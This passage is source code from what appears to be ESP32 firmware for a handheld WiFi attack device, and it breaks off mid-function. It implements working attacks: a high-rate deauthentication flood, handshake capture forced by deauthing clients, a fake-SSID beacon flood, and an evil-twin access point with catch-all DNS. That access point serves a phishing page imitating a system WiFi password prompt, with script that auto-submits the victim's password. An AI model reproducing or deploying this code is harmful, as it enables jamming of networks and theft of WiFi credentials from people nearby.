  Serial.println("\n[*] Stopping deauth flood...");
  Serial.printf("    Total packets sent: %d\n", deauthFloodPackets);
  
  unsigned long runtime = (millis() - lastDeauthFloodUpdate) / 1000;
  if (runtime > 0) {
    Serial.printf("    Average rate: %d pkt/sec\n", deauthFloodPackets / runtime);
  }
  
  // Clean WiFi shutdown
  esp_wifi_stop();
  delay(200);
  
  // Reinit to normal mode
  WiFi.mode(WIFI_STA);
  delay(200);
  
  addToConsole("Deauth flood stopped");
  
  currentState = WIFI_MENU;
  drawWiFiMenu();
}

// ==================== performDeauthFlood() ====================
void performDeauthFlood() {
  if (!deauthFloodActive || deauthTargetCount == 0) return;
  
  static unsigned long lastBurst = 0;
  static uint16_t sequenceNum = 0;
  
  // ⚡ ULTRA AGGRESSIVE: Send every 50ms (was 100ms) = 20 bursts/sec
  if (millis() - lastBurst < 50) return;
  lastBurst = millis();
  
  // Reason codes array
  const uint8_t reasonCodes[] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
  };
  
  // Send to ALL targets
  for (int i = 0; i < deauthTargetCount; i++) {
    DeauthTarget* target = &deauthTargets[i];
    
    if (!target->active) continue;
    
    // Set channel
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    delayMicroseconds(50);
    
    // ⚡⚡⚡ CRITICAL: Send 6 packets per target (was 3)
    for (int reasonIdx = 0; reasonIdx < 6; reasonIdx++) {
      uint8_t reason = reasonCodes[reasonIdx % 8];
      
      // === PACKET 1: AP → Broadcast ===
      uint8_t deauth_ap_broadcast[26] = {
        0xC0, 0x00,                         
        0x3A, 0x01,                         
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        target->bssid[0], target->bssid[1], target->bssid[2], 
        target->bssid[3], target->bssid[4], target->bssid[5], 
        target->bssid[0], target->bssid[1], target->bssid[2], 
        target->bssid[3], target->bssid[4], target->bssid[5], 
        (uint8_t)((sequenceNum << 4) & 0xF0), 
        (uint8_t)((sequenceNum >> 4) & 0xFF), 
        reason, 0x00                          
      };
      
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_ap_broadcast, 26, false);
      target->packetsSent++;
      deauthFloodPackets++;
      sequenceNum = (sequenceNum + 1) & 0xFFF;
      
      delayMicroseconds(50);  // Minimal delay
      
      // === PACKET 2: Broadcast → AP (bidirectional) ===
      uint8_t deauth_broadcast_ap[26] = {
        0xC0, 0x00,
        0x3A, 0x01,                         
        target->bssid[0], target->bssid[1], target->bssid[2], 
        target->bssid[3], target->bssid[4], target->bssid[5], 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        target->bssid[0], target->bssid[1], target->bssid[2], 
        target->bssid[3], target->bssid[4], target->bssid[5], 
        (uint8_t)((sequenceNum << 4) & 0xF0),
        (uint8_t)((sequenceNum >> 4) & 0xFF),
        reason, 0x00
      };
      
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_broadcast_ap, 26, false);
      target->packetsSent++;
      deauthFloodPackets++;
      sequenceNum = (sequenceNum + 1) & 0xFFF;
      
      delayMicroseconds(50);
    }
    
    delayMicroseconds(100);  // Brief pause between targets
  }
  
  esp_task_wdt_reset();
}

// ==================== displayDeauthFlood() ====================
void displayDeauthFlood() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("deauth flood");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - compact
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Targets:%d", deauthTargetCount);
  
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(100, statsY);
  tft.printf("Sent:%d", deauthFloodPackets);
  
  // Packets per second
  unsigned long runtime = max(1UL, (millis() - lastDeauthFloodUpdate) / 1000);
  uint32_t pps = deauthFloodPackets / runtime;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(180, statsY);
  tft.printf("%d/s", pps);
  
  // Mode indicator
  statsY += 12;
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.print("Mode: MARAUDER");
  
  // Separator
  int listY = HEADER_HEIGHT + 32;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  // Column headers
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TARGET");
  tft.setCursor(130, listY);
  tft.print("CH");
  tft.setCursor(155, listY);
  tft.print("PKTS");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Display targets (max 9 visible)
  int displayCount = min(deauthTargetCount, 9);
  
  for (int i = 0; i < displayCount; i++) {
    int y = listY + (i * 22);
    
    // SSID
    String displaySSID = deauthTargets[i].ssid;
    if (displaySSID.length() == 0) displaySSID = "<hidden>";
    if (displaySSID.length() > 16) displaySSID = displaySSID.substring(0, 15) + "~";
    
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print(displaySSID);
    
    // Channel
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(130, y);
    tft.printf("%2d", deauthTargets[i].channel);
    
    // Packets sent
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(155, y);
    tft.printf("%4d", deauthTargets[i].packetsSent);
  }
  
  // Footer message
  int msgY = listY + (displayCount * 22) + 10;
  tft.drawFastHLine(0, msgY, 240, COLOR_DARK_GREEN);
  msgY += 8;
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setTextSize(1);
  tft.setCursor(SIDE_MARGIN, msgY);
  tft.print("Bidirectional deauth attack");
  msgY += 12;
  tft.setCursor(SIDE_MARGIN, msgY);
  tft.print("with multiple reason codes");
  
  msgY += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, msgY);
  tft.printf("Efficiency: ");
  
  // Show efficiency rating based on PPS
  if (pps > 150) {
    tft.setTextColor(COLOR_GREEN);
    tft.print("EXCELLENT");
  } else if (pps > 80) {
    tft.setTextColor(COLOR_CYAN);
    tft.print("VERY GOOD");
  } else if (pps > 40) {
    tft.setTextColor(COLOR_YELLOW);
    tft.print("GOOD");
  } else {
    tft.setTextColor(COLOR_ORANGE);
    tft.print("MODERATE");
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== NEW: updateDeauthFloodDisplay() ====================
void updateDeauthFloodDisplay() {
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 300) return;
  lastUpdate = millis();
  
  // Update only dynamic stats (avoid full redraw)
  int statsY = HEADER_HEIGHT + 5;
  
  // Clear stats area
  tft.fillRect(100, statsY, 140, 12, COLOR_BG);
  
  // Update packets sent
  tft.setTextColor(COLOR_ORANGE);
  tft.setTextSize(1);
  tft.setCursor(100, statsY);
  tft.printf("Sent:%d", deauthFloodPackets);
  
  // Update rate
  unsigned long runtime = max(1UL, (millis() - lastDeauthFloodUpdate) / 1000);
  uint32_t pps = deauthFloodPackets / runtime;
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(180, statsY);
  tft.printf("%d/s", pps);
  
  // Update individual target counters
  int listY = HEADER_HEIGHT + 37;
  int displayCount = min(deauthTargetCount, 9);
  
  for (int i = 0; i < displayCount; i++) {
    int y = listY + (i * 22);
    
    // Clear packet count area
    tft.fillRect(155, y, 80, 10, COLOR_BG);
    
    // Redraw packet count
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(155, y);
    tft.printf("%4d", deauthTargets[i].packetsSent);
  }
}


// ==================== STANDALONE HANDSHAKE CAPTURE ====================
void startHandshakeCapture() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    showMessage("No target selected!", COLOR_WARNING);
    return;
  }
  
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) return;
  
  // Reset handshake
  capturedHandshake.captured = false;
  memset(&capturedHandshake, 0, sizeof(HandshakeData));
  
  // Stop conflicting operations
  if (portalActive) stopCaptivePortal();
  if (beaconFloodActive) beaconFloodActive = false;
  
  // Set up promiscuous mode for handshake capture
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
  
  // Start deauth to force handshake
  deauthActive = true;
  currentDeauthMethod = 0; // Use standard deauth
  deauthPacketsSent = 0;
  
  currentState = HANDSHAKE_CAPTURE;
  
  Serial.printf("[*] Handshake capture mode on %s (Ch %d)\n", 
                selectedSSID.c_str(), 
                networks[targetIndex].channel);
  
  addToConsole("Capturing handshake...");
  displayHandshakeCapture();
}

void displayHandshakeCapture() {
  // ✅ FIX: Always do full redraw to prevent double UI
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("handshake capture");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 10;
  
  // Target info - compact
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Target: ");
  tft.setTextColor(COLOR_YELLOW);
  String truncSSID = selectedSSID;
  if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
  tft.print(truncSSID);
  
  // Channel on same line
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex != -1) {
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print(" Ch");
    tft.setTextColor(COLOR_CYAN);
    tft.printf("%d", networks[targetIndex].channel);
  }
  
  y += 18;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 8;
  
  // Deauth stats - compact
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Deauth:");
  
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(55, y);
  tft.printf("%d", deauthPacketsSent);
  
  // Packets per second
  static unsigned long lastPktCount = 0;
  static unsigned long lastPktTime = 0;
  static uint32_t packetsPerSec = 0;
  if (millis() - lastPktTime > 1000) {
    packetsPerSec = deauthPacketsSent - lastPktCount;
    lastPktCount = deauthPacketsSent;
    lastPktTime = millis();
  }
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(100, y);
  tft.printf("(%d/s)", packetsPerSec);
  
  y += 18;
  
  // Handshake status
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Handshake: ");
  
  if (capturedHandshake.captured) {
    // BLINK EFFECT when captured
    static unsigned long captureBlinkTime = 0;
    static bool captureBlinkState = false;
    
    if (captureBlinkTime == 0) {
      captureBlinkTime = millis();
      captureBlinkState = true;
    }
    
    bool showText = true;
    if (millis() - captureBlinkTime < 5000) {
      if (millis() / 200 % 2 == 0) {
        showText = true;
      } else {
        showText = false;
      }
    } else {
      showText = true; // Always show after 5 seconds
    }
    
    if (showText) {
      tft.setTextColor(COLOR_GREEN);
      tft.print("CAPTURED!");
    }
    
    y += 20;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    y += 8;
    
    // MAC addresses - compact format
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("AP:");
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(30, y);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
               capturedHandshake.apMAC[0], capturedHandshake.apMAC[1],
               capturedHandshake.apMAC[2], capturedHandshake.apMAC[3],
               capturedHandshake.apMAC[4], capturedHandshake.apMAC[5]);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("CL:");
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(30, y);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
               capturedHandshake.clientMAC[0], capturedHandshake.clientMAC[1],
               capturedHandshake.clientMAC[2], capturedHandshake.clientMAC[3],
               capturedHandshake.clientMAC[4], capturedHandshake.clientMAC[5]);
    
    y += 20;
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Ready to validate passwords!");
    
  } else {
    tft.setTextColor(COLOR_YELLOW);
    tft.print("WAITING...");
    
    y += 20;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Forcing 4-way handshake");
    
    // Animated dots
    int dots = (millis() / 500) % 4;
    for (int i = 0; i < 3; i++) {
      tft.print(i < dots ? "." : " ");
    }
  }
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 8;
  
  // Duration
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Duration: ");
  unsigned long runtime = (millis() - lastAttackTime) / 1000;
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d sec", runtime);
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

void performBeaconFlood() {
  if (customBeaconCount == 0) return;
  
  static bool initialized = false;
  static int beaconIndex = 0;
  static uint8_t channel = 1;
  static unsigned long lastChannelHop = 0;
  static unsigned long lastBeacon = 0;
  
  // ✅ FIX 1: Rate limiting to prevent crash (max 10 beacons/sec)
  if (millis() - lastBeacon < 100) return;
  lastBeacon = millis();
  
  // ✅ FIX 2: Watchdog reset
  esp_task_wdt_reset();
  
  if (!initialized) {
    // Stop any existing WiFi first
    wifi_mode_t currentMode;
    esp_wifi_get_mode(&currentMode);
    if (currentMode != WIFI_MODE_NULL) {
      esp_wifi_stop();
    }
    delay(100);
    
    // Start in AP mode
    wifi_config_t ap_config = {};
    strcpy((char*)ap_config.ap.ssid, "P4WNC4K3");
    ap_config.ap.ssid_len = strlen("P4WNC4K3");
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 0;
    ap_config.ap.beacon_interval = 60000;
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    delay(200);
    
    initialized = true;
  }
  
  // Get SSID to broadcast
  String fakeSSID = customBeacons[beaconIndex];
  beaconIndex = (beaconIndex + 1) % customBeaconCount;
  
  // ✅ FIX 3: Length validation
  if (fakeSSID.length() == 0 || fakeSSID.length() > 32) {
    return;  // Skip invalid SSID
  }
  
  // Create proper beacon frame
  uint8_t beaconPacket[200];
  int packetSize = 0;
  
  // === 802.11 MAC Header ===
  beaconPacket[0] = 0x80;
  beaconPacket[1] = 0x00;
  
  // Duration
  beaconPacket[2] = 0x00;
  beaconPacket[3] = 0x00;
  
  // Destination address (broadcast)
  for (int i = 4; i < 10; i++) beaconPacket[i] = 0xFF;
  
  // Source address (random MAC)
  for (int i = 10; i < 16; i++) beaconPacket[i] = random(0, 256);
  
  // BSSID (same as source)
  for (int i = 16; i < 22; i++) beaconPacket[i] = beaconPacket[i - 6];
  
  // Sequence number
  beaconPacket[22] = 0x00;
  beaconPacket[23] = 0x00;
  
  // === Beacon Frame Body ===
  uint64_t timestamp = esp_timer_get_time();
  memcpy(&beaconPacket[24], &timestamp, 8);
  
  beaconPacket[32] = 0x64;  // Beacon interval
  beaconPacket[33] = 0x00;
  
  beaconPacket[34] = 0x01;  // Capability
  beaconPacket[35] = 0x00;
  
  packetSize = 36;
  
  // === Information Elements ===
  beaconPacket[packetSize++] = 0x00;  // SSID tag
  beaconPacket[packetSize++] = fakeSSID.length();
  memcpy(&beaconPacket[packetSize], fakeSSID.c_str(), fakeSSID.length());
  packetSize += fakeSSID.length();
  
  // Supported rates
  beaconPacket[packetSize++] = 0x01;
  beaconPacket[packetSize++] = 0x08;
  beaconPacket[packetSize++] = 0x82;
  beaconPacket[packetSize++] = 0x84;
  beaconPacket[packetSize++] = 0x8B;
  beaconPacket[packetSize++] = 0x96;
  beaconPacket[packetSize++] = 0x24;
  beaconPacket[packetSize++] = 0x30;
  beaconPacket[packetSize++] = 0x48;
  beaconPacket[packetSize++] = 0x6C;
  
  // DS Parameter
  beaconPacket[packetSize++] = 0x03;
  beaconPacket[packetSize++] = 0x01;
  beaconPacket[packetSize++] = channel;
  
  // TIM
  beaconPacket[packetSize++] = 0x05;
  beaconPacket[packetSize++] = 0x04;
  beaconPacket[packetSize++] = 0x00;
  beaconPacket[packetSize++] = 0x01;
  beaconPacket[packetSize++] = 0x00;
  beaconPacket[packetSize++] = 0x00;
  
  // ✅ FIX 4: Validate packet size before sending
  if (packetSize > 0 && packetSize < 200) {
    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
  }
  
  // Channel hopping (every 50 beacons)
  static int beaconCount = 0;
  beaconCount++;
  if (beaconCount % 50 == 0) {
    channel = (channel % 13) + 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  }
  
  // ✅ FIX 5: Delay to prevent overwhelming
  delay(10);
  
  if (!beaconFloodActive) {
    initialized = false;
  }
}

// ==================== EVIL TWIN (Portal + Deauth) ====================
void startEvilTwin() {
  if (selectedSSID.length() == 0 || networkCount == 0) {
    addToConsole("ERROR: No target");
    drawAttackMenu();
    return;
  }
  
  int targetIndex = -1;
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].ssid == selectedSSID) {
      targetIndex = i;
      break;
    }
  }
  
  if (targetIndex == -1) {
    addToConsole("ERROR: Target not found");
    drawAttackMenu();
    return;
  }
  
  // ✅ CRITICAL: Stop ALL conflicting operations with proper delays
  Serial.println("\n[*] Starting Evil Twin Attack...");
  
  if (snifferActive) {
    stopSniffer();
    delay(200);
  }
  if (beaconFloodActive) {
    beaconFloodActive = false;
    delay(100);
  }
  if (currentState == HANDSHAKE_CAPTURE) {
    esp_wifi_set_promiscuous(false);
    delay(100);
  }
  
  // ✅ CRITICAL: Complete WiFi reset (like Marauder)
  Serial.println("[*] Resetting WiFi stack...");
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(500);
  esp_task_wdt_reset();
  
  // Stop and restart WiFi
  esp_wifi_stop();
  delay(200);
  esp_wifi_deinit();
  delay(200);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  delay(200);
  
  // ✅ CRITICAL: Set to AP mode FIRST
  esp_wifi_set_mode(WIFI_MODE_AP);
  delay(200);
  esp_wifi_start();
  delay(200);
  esp_task_wdt_reset();
  
  // ✅ Configure AP with EXACT target settings (crucial for effectiveness)
  wifi_config_t ap_config = {};
  
  // Copy target SSID exactly
  strncpy((char*)ap_config.ap.ssid, selectedSSID.c_str(), 32);
  ap_config.ap.ssid_len = selectedSSID.length();
  
  // Match target channel EXACTLY
  ap_config.ap.channel = networks[targetIndex].channel;
  
  // ✅ REMOVED: BSSID copying (not supported in wifi_ap_config_t)
  // The ESP32 will generate its own BSSID
  
  // Match encryption type
  if (networks[targetIndex].isEncrypted) {
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    strcpy((char*)ap_config.ap.password, "dummypass123"); // Fake password
  } else {
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
  }
  
  // ✅ Enhanced AP settings for visibility
  ap_config.ap.max_connection = 10;  // Allow multiple victims
  ap_config.ap.beacon_interval = 100;  // Standard interval
  
  // Apply configuration
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  delay(200);
  
  // Start AP
  WiFi.softAP(selectedSSID.c_str());
  delay(500);
  esp_task_wdt_reset();
  
  // ✅ CRITICAL: Set TX power to MAX for stronger signal
  esp_wifi_set_max_tx_power(84);  // Maximum power (21 dBm)
  
  // Force channel
  esp_wifi_set_channel(networks[targetIndex].channel, WIFI_SECOND_CHAN_NONE);
  delay(100);
  
  // Get AP IP
  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("[+] Evil Twin AP started\n");
  Serial.printf("    SSID: %s\n", selectedSSID.c_str());
  Serial.printf("    Channel: %d\n", networks[targetIndex].channel);
  Serial.printf("    IP: %s\n", apIP.toString().c_str());
  
  // ✅ Start deauth AFTER portal is ready
  deauthActive = true;
  deauthPacketsSent = 0;
  currentDeauthMethod = 1;  // Storm mode for Evil Twin
  portalActive = true;
  
  // ✅ CRITICAL: DNS server - redirect ALL domains
  dnsServer.stop();
  delay(100);
  dnsServer.start(53, "*", apIP);
  Serial.println("[+] DNS server started (catch-all)");
  
  // ✅ Configure web server with ALL common captive portal routes
  webServer.stop();
  delay(100);
  
  // Main routes
  webServer.on("/", HTTP_GET, handlePortalRoot);
  webServer.on("/post", HTTP_POST, handlePortalPost);
  
  // Android captive portal detection
  webServer.on("/generate_204", HTTP_GET, handlePortalRoot);
  webServer.on("/gen_204", HTTP_GET, handlePortalRoot);
  webServer.on("/ncsi.txt", HTTP_GET, handlePortalRoot);
  
  // iOS captive portal detection
  webServer.on("/hotspot-detect.html", HTTP_GET, handlePortalRoot);
  webServer.on("/library/test/success.html", HTTP_GET, handlePortalRoot);
  webServer.on("/captive", HTTP_GET, handlePortalRoot);
  
  // Windows captive portal detection
  webServer.on("/connecttest.txt", HTTP_GET, handlePortalRoot);
  webServer.on("/redirect", HTTP_GET, handlePortalRoot);
  webServer.on("/msftconnecttest/connecttest.txt", HTTP_GET, handlePortalRoot);
  
  // Generic routes
  webServer.on("/canonical.html", HTTP_GET, handlePortalRoot);
  webServer.on("/success.txt", HTTP_GET, handlePortalRoot);
  webServer.on("/status", HTTP_GET, handlePortalRoot);
  webServer.on("/chat", HTTP_GET, handlePortalRoot);
  
  // Catch all other requests
  webServer.onNotFound(handlePortalRoot);
  
  webServer.begin();
  Serial.println("[+] Web server started on port 80");
  
  Serial.println("\n[+] ===== EVIL TWIN ACTIVE =====");
  Serial.println("    Aggressive deauth enabled");
  Serial.println("    Waiting for victims...");
  Serial.println("===================================\n");
  
  addToConsole("Evil Twin: ACTIVE + DEAUTH");
  drawAttackMenu();
}

// ==================== START CAPTIVE PORTAL (CALLED BY SERIAL COMMAND) ====================
void startCaptivePortal() {
  // This is just an alias for startEvilTwin() for serial command compatibility
  startEvilTwin();
}

void stopCaptivePortal() {
  portalActive = false;
  
  Serial.println("\n[*] Stopping Evil Twin...");
  
  // Stop web server
  webServer.stop();
  delay(100);
  
  // Stop DNS server
  dnsServer.stop();
  delay(100);
  
  // Stop deauth if active
  if (deauthActive) {
    deauthActive = false;
    delay(100);
  }
  
  // Clean WiFi shutdown
  esp_wifi_stop();
  delay(200);
  
  // Reinit to normal mode
  WiFi.mode(WIFI_STA);
  delay(200);
  
  Serial.printf("[+] Evil Twin stopped - %d passwords captured\n", capturedCredCount);
  addToConsole("Evil Twin stopped");
  
  if (currentState == WIFI_ATTACK_MENU) {
    drawAttackMenu();
  }
}

void handlePortalRoot() {
  // ✅ CRITICAL: Set proper headers for captive portal detection
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "0");
  
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Wi-Fi Network Authentication</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'>";
  html += "<meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>";
  html += "<meta http-equiv='Pragma' content='no-cache'>";
  html += "<meta http-equiv='Expires' content='0'>";
  
  // ✅ Favicon to prevent 404 errors
  html += "<link rel='icon' href='data:,'>";
  
  html += "<style>";
  html += "*{margin:0;padding:0;box-sizing:border-box;}";
  html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
  html += "background:#e5e5e5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px;}";
  html += ".container{background:#f0f0f0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
  html += "width:100%;max-width:450px;}";
  html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:15px;";
  html += "border-radius:12px 12px 0 0;display:flex;align-items:center;gap:15px;border-bottom:1px solid #b0b0b0;}";
  html += ".wifi-icon{min-width:50px;width:50px;height:50px;display:flex;align-items:center;justify-content:center;}";
  html += ".wifi-icon svg{width:100%;height:100%;}";
  html += ".header-text{flex:1;min-width:0;}";
  html += ".network-name{font-size:15px;font-weight:600;color:#000;margin:0 0 4px 0;word-wrap:break-word;}";
  html += ".network-info{font-size:12px;color:#505050;margin:0;}";
  html += ".content{padding:20px;}";
  html += ".form-group{margin-bottom:15px;}";
  html += "label{display:flex;flex-direction:column;color:#000;font-size:13px;font-weight:500;margin-bottom:8px;}";
  html += "@media (min-width: 400px){label{flex-direction:row;align-items:center;gap:10px;}}";
  html += "label span{min-width:80px;text-align:left;}";
  html += "@media (min-width: 400px){label span{text-align:right;}}";
  html += "input[type='password']{flex:1;padding:10px 12px;border:2px solid #a0a0a0;border-radius:6px;";
  html += "font-size:16px;background:#fff;width:100%;-webkit-appearance:none;}";
  html += "input[type='password']:focus{outline:none;border-color:#007AFF;box-shadow:0 0 0 3px rgba(0,122,255,0.2);}";
  html += ".checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding-left:0;}";
  html += "@media (min-width: 400px){.checkbox-group{padding-left:90px;}}";
  html += "input[type='checkbox']{width:18px;height:18px;cursor:pointer;accent-color:#007AFF;flex-shrink:0;}";
  html += ".checkbox-label{font-size:13px;color:#000;user-select:none;cursor:pointer;}";
  html += ".footer{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;";
  html += "background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;";
  html += "flex-wrap:wrap;gap:10px;}";
  html += ".help-btn{width:28px;height:28px;border-radius:50%;background:#fff;border:1px solid #a0a0a0;";
  html += "color:#007AFF;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;}";
  html += ".action-btns{display:flex;gap:10px;flex:1;justify-content:flex-end;}";
  html += "@media (max-width: 350px){.action-btns{width:100%;justify-content:space-between;}}";
  html += ".btn{padding:8px 16px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;border:1px solid;";
  html += "white-space:nowrap;min-width:70px;text-align:center;}";
  html += ".btn-cancel{background:#fff;border-color:#a0a0a0;color:#000;}";
  html += ".btn-join{background:#007AFF;border-color:#007AFF;color:#fff;opacity:0.4;pointer-events:none;}";
  html += ".btn-join.active{opacity:1;pointer-events:auto;}";
  html += ".btn-join:active{background:#0051D5;}";
  html += "</style></head><body>";
  
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<div class='wifi-icon'>";
  html += "<svg viewBox='0 0 60 60' fill='none' xmlns='http://www.w3.org/2000/svg'>";
  html += "<path d='M30 45 C32.5 45 35 42.5 35 40 C35 37.5 32.5 35 30 35 C27.5 35 25 37.5 25 40 C25 42.5 27.5 45 30 45Z' fill='#007AFF'/>";
  html += "<path d='M30 30 C25 30 20 32.5 17 37' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "<path d='M30 30 C35 30 40 32.5 43 37' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "<path d='M30 20 C22 20 14 24 9 30' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "<path d='M30 20 C38 20 46 24 51 30' stroke='#007AFF' stroke-width='3' stroke-linecap='round' fill='none'/>";
  html += "</svg>";
  html += "</div>";
  html += "<div class='header-text'>";
  html += "<h2 class='network-name'>\"" + selectedSSID + "\"</h2>";
  html += "<p class='network-info'>requires a password</p>";
  html += "</div></div>";
  
  html += "<form action='/post' method='post' id='wifiForm'>";
  html += "<div class='content'>";
  html += "<div class='form-group'>";
  html += "<label><span>Password:</span>";
  html += "<input type='password' name='password' id='password' required autofocus autocomplete='off'>";
  html += "</label></div>";
  html += "<div class='checkbox-group'>";
  html += "<input type='checkbox' id='showPwd'>";
  html += "<label for='showPwd' class='checkbox-label'>Show password</label>";
  html += "</div>";
  html += "<div class='checkbox-group'>";
  html += "<input type='checkbox' id='remember' checked>";
  html += "<label for='remember' class='checkbox-label'>Remember this network</label>";
  html += "</div></div>";
  
  html += "<div class='footer'>";
  html += "<div class='help-btn'>?</div>";
  html += "<div class='action-btns'>";
  html += "<button type='button' class='btn btn-cancel' onclick='window.history.back()'>Cancel</button>";
  html += "<button type='submit' class='btn btn-join' id='joinBtn'>Join</button>";
  html += "</div></div></form></div>";
  
  html += "<script>";
  html += "const pwd=document.getElementById('password');";
  html += "const show=document.getElementById('showPwd');";
  html += "const join=document.getElementById('joinBtn');";
  html += "show.addEventListener('change',()=>{pwd.type=show.checked?'text':'password';});";
  html += "pwd.addEventListener('input',()=>{join.classList.toggle('active',pwd.value.length>0);});";
  
  // ✅ Auto-submit after 3 seconds of typing (subtle pressure)
  html += "let timeout;";
  html += "pwd.addEventListener('input',()=>{";
  html += "clearTimeout(timeout);";
  html += "if(pwd.value.length>=8){";
  html += "timeout=setTimeout(()=>{document.getElementById('wifiForm').submit();},3000);";
  html += "}});";
  
  html += "</script></body></html>";
  
